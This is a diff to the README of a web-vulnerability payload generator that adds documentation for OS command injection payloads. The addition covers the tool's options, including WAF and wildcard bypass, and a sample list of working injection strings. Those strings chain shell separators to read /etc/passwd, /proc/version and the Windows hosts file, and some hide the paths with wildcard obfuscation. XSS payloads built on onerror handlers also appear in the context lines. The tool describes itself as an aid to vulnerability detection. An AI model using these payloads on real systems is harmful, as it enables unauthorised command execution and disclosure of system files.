@@ -6,7 +6,7 @@ Payload Generator Tool. These payloads are only help to detect the vulnerability
 - [x] HTML Injection Payload Generation
 - [x] Open Redirection Payload Generation
 - [x] SQL Injection Payload Generation
-- [ ] Command Injection Payload Generation
+- [x] Command Injection Payload Generation
 - [x] SSI Injection Payload Generation
 - [x] PHP Code Injection Payload Generation
 - [x] File & Path Traversal Payload Generation
@@ -320,4 +320,61 @@ python3 generator.py htmli --strip-space --tag "img" --tag "s" --tag "h1" --comb
 <img/onerror=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
 <h1/onerror=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
 <s/onmouseover=confirm``/id=ow5wJTl9SMUkTLrz0ljJ/>
+```
+
+## OS Command Injection
+
+### Help
+
+```bash
+usage: generator.py os [-h] [--reflective] [--time-based] [--oast] [--unique-string] [--sleep-timeout] [--oast-domain] [-w] [-l] [--urlencode] [--wildcard] [--waf]
+
+options:
+  -h, --help        show this help message and exit
+
+OS Command Injection Payload Types:
+  --reflective      Generate Reflective Payloads
+  --time-based      Generate Time-Based Payloads
+  --oast            Generate OAST Payloads
+
+OS Command Injection Payload Options:
+  --unique-string   Set Unique String
+  --sleep-timeout   Set Sleep Timeout
+  --oast-domain     Set OAST Domain
+
+OS Command Injection Platform Options:
+  -w, --windows     Generate Windows Based payloads
+  -l, --linux       Generate Linux Based payloads
+
+OS Command Injection Payload Mutation Options:
+  --urlencode       URL Encode the payloads
+  --wildcard        Wildcard Bypass Linux Reflective payloads
+  --waf             Apply Waf Bypass
+
+```
+
+### Example Payload Generation
+
+```bash
+python3 generator.py os --reflective --wildcard | head -n 20
+'echo kzie5pWQWUJZW45UBWDs\t
+"cat /proc/version%0a
+`cat /?tc/?a??wd&&
+${IFS}cat /proc/version%0a
+|cat /?r?c/v?r?i?n!
+'echo $(( 1337 * 1337 ))%0a
+#yes kzie5pWQWUJZW45UBWDs | head -n 3 | tr -d '\n';
+$type C:\Windows\System32\drivers\etc\hosts$
+#cat /?tc/?a??wd%0a
+&&type C:\Windows\System32\drivers\etc\hosts"
+\tcat /?tc/?a??wd#
+#type C:\Windows\System32\drivers\etc\hosts#
+/cat /?r?c/v?r?i?n\t
+&cat /proc/version/
+;echo kzie5pWQWUJZW45UBWDs/
+\nyes kzie5pWQWUJZW45UBWDs | head -n 3 | tr -d '\n'`
+/echo $(( 1337 * 1337 ))!
+\tcat /etc/passwd!
+&type C:\Windows\System32\drivers\etc\hosts|
+"type C:\Windows\System32\drivers\etc\hosts%0a
 ```
